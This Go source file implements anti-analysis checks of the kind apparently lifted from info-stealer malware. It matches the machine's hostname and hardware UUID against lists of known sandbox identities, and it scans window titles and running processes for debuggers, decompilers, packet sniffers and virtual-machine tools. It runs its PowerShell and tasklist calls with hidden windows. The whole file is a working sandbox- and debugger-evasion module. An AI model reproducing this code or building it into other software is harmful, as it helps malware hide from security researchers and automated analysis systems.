package CheckBlacklistedWindowsNames

import (
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var (
	mu32  = syscall.NewLazyDLL("user32.dll")
	pew   = mu32.NewProc("EnumWindows")
	pgwt  = mu32.NewProc("GetWindowTextA")
	pgwtp = mu32.NewProc("GetWindowThreadProcessId")
	mk32  = syscall.NewLazyDLL("kernel32.dll")
	pop   = mk32.NewProc("OpenProcess")
	ptp   = mk32.NewProc("TerminateProcess")
	pch   = mk32.NewProc("CloseHandle")
)

// Full banned UUIDs list
var bannedUUIDs = []string{
	"7AB5C494-39F5-4941-9163-47F54D6D5016",
	"7204B444-B03C-48BA-A40F-0D1FE2E4A03B",
	"88F1A492-340E-47C7-B017-AAB2D6F6976C",
	"129B5E6B-E368-45D4-80AB-D4F106495924",
	"8F384129-F079-456E-AE35-16608E317F4F",
	"E6833342-780F-56A2-6F92-77DACC2EF8B3",
	"032E02B4-0499-05C3-0806-3C0700080009",
	"03DE0294-0480-05DE-1A06-350700080009",
	"11111111-2222-3333-4444-555555555555",
	"71DC2242-6EA2-C40B-0798-B4F5B4CC8776",
	"6F3CA5EC-BEC9-4A4D-8274-11168F640058",
	"ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
	"4C4C4544-0050-3710-8058-CAC04F59344A",
	"00000000-0000-0000-0000-AC1F6BD04972",
	"00000000-0000-0000-0000-AC1F6BD04C9E",
	"00000000-0000-0000-0000-000000000000",
	"5BD24D56-789F-8468-7CDC-CAA7222CC121",
	"49434D53-0200-9065-2500-65902500E439",
	"49434D53-0200-9036-2500-36902500F022",
	"777D84B3-88D1-451C-93E4-D235177420A7",
	"49434D53-0200-9036-2500-369025000C65",
	"B1112042-52E8-E25B-3655-6A4F54155DBF",
	"00000000-0000-0000-0000-AC1F6BD048FE",
	"EB16924B-FB6D-4FA1-8666-17B91F62FB37",
	"A15A930C-8251-9645-AF63-E45AD728C20C",
	"67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
	"C7D23342-A5D4-68A1-59AC-CF40F735B363",
	"63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
	"44B94D56-65AB-DC02-86A0-98143A7423BF",
	"6608003F-ECE4-494E-B07E-1C4615D1D93C",
	"D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
	"49434D53-0200-9036-2500-369025003AF0",
	"8B4E8278-525C-7343-B825-280AEBCD3BCB",
	"4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
	"79AF5279-16CF-4094-9758-F88A616D81B4",
}

// Full banned computer names list
var bannedComputerNames = []string{
	"WDAGUtilityAccount", "Harry Johnson", "JOANNA", "WINZDS-21T43RNG",
	"Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
	"8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b",
	"PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT",
	"WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB",
	"DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "DESKTOP-B0T93D6",
	"DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "COMPNAME_4491", "WILEYPC", "WORK", "KATHLROGE",
	"DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ",
	"DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "DESKTOP-NNSJYNR",
	"JULIA-PC", "DESKTOP-BQISITB", "d1bnJkfVlH",
}

// Full banned processes list
var bannedProcesses = []string{
	"HTTP Toolkit.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe",
	"df5serv.exe", "processhacker.exe", "vmtoolsd.exe",
	"ida64.exe", "ollydbg.exe", "pestudio.exe", "vgauthservice.exe", "vmacthlp.exe",
	"x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe",
	"qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe",
}

var blacklistedWindows = []string{
	"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy", "titanHide", "ilspy", "titanhide",
	"x32dbg", "codecracker", "simpleassembly", "process hacker 2", "pc-ret", "http debugger", "Centos",
	"process monitor", "debug", "ILSpy", "reverse", "simpleassemblyexplorer", "de4dotmodded",
	"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza", "crack", "strongod",
	"ida -", "brute", "dump", "StringDecryptor", "wireshark", "debugger", "httpdebugger", "gdb", "kdb",
	"x64_dbg", "windbg", "x64netdumper", "petools", "scyllahide", "megadumper", "reversal",
	"ksdumper v1.1 - by equifox", "dbgclr", "HxD", "peek", "ollydbg", "ksdumper", "http",
	"wpe pro", "dbg", "httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
	"mdbg", "WPE PRO", "system explorer", "de4dot", "X64NetDumper", "protection_id", "charles",
	"systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "0harmony",
	"dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "cheat engine", "hacker", "windbg.exe",
	"petools.exe", "hacker.exe",
}

const CREATE_NO_WINDOW = 0x08000000

// enumWindowsAndCheck enumerates windows and returns true if any blacklisted window title is found
func enumWindowsAndCheck() bool {
	foundBlacklisted := false

	// Wrap enumWindowsProc callback to mark if blacklisted window found
	callback := func(hwnd syscall.Handle, lParam uintptr) uintptr {
		var pid uint32
		pgwtp.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))

		var title [256]byte
		pgwt.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title[0])), uintptr(len(title)))
		wt := string(title[:])
		wt = strings.Trim(wt, "\x00")

		for _, blacklisted := range blacklistedWindows {
			if strings.Contains(strings.ToLower(wt), strings.ToLower(blacklisted)) {
				foundBlacklisted = true
				break
			}
		}
		return 1 // Continue enumeration
	}

	pew.Call(syscall.NewCallback(callback), 0)

	return foundBlacklisted
}

// checkBannedProcesses returns true if any banned process is running (does NOT terminate)
func checkBannedProcesses() bool {
	cmd := exec.Command("tasklist", "/fo", "csv", "/nh")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}
		fields := parseCSVLine(line)
		if len(fields) < 2 {
			continue
		}
		procName := strings.Trim(fields[0], "\"")

		for _, bannedProc := range bannedProcesses {
			if strings.EqualFold(procName, bannedProc) {
				return true
			}
		}
	}

	return false
}

// parseCSVLine is a simple CSV parser for one line (handles quoted commas)
func parseCSVLine(line string) []string {
	var res []string
	var cur strings.Builder
	inQuotes := false
	for i := 0; i < len(line); i++ {
		ch := line[i]
		if ch == '"' {
			inQuotes = !inQuotes
			continue
		}
		if ch == ',' && !inQuotes {
			res = append(res, cur.String())
			cur.Reset()
			continue
		}
		cur.WriteByte(ch)
	}
	res = append(res, cur.String())
	return res
}

// checkBannedUUID example, using PowerShell to get UUID and match banned
func checkBannedUUID() bool {
	cmd := exec.Command(
		"powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-Command",
		"Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID",
	)
	// Hide the console window entirely
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}

	out, err := cmd.Output()
	if err != nil {
		return false
	}
	uuid := strings.TrimSpace(string(out))
	uuid = strings.ToUpper(uuid)
	for _, banned := range bannedUUIDs {
		if uuid == banned {
			return true
		}
	}
	return false
}

// CheckBlacklistedWindows checks windows and processes against blacklist and returns true if any blacklist matches found.
func CheckBlacklistedWindows() bool {
	// Check banned computer name early and return true if matched
	hostname, err := os.Hostname()
	if err == nil {
		for _, bannedName := range bannedComputerNames {
			if strings.EqualFold(hostname, bannedName) {
				return true
			}
		}
	}

	// Check banned UUIDs (via PowerShell)
	if checkBannedUUID() {
		return true
	}

	// Enumerate windows and check blacklisted window titles
	if enumWindowsAndCheck() {
		return true
	}

	// Enumerate running processes and check banned ones
	if checkBannedProcesses() {
		return true
	}

	// No blacklist conditions matched
	return false
}
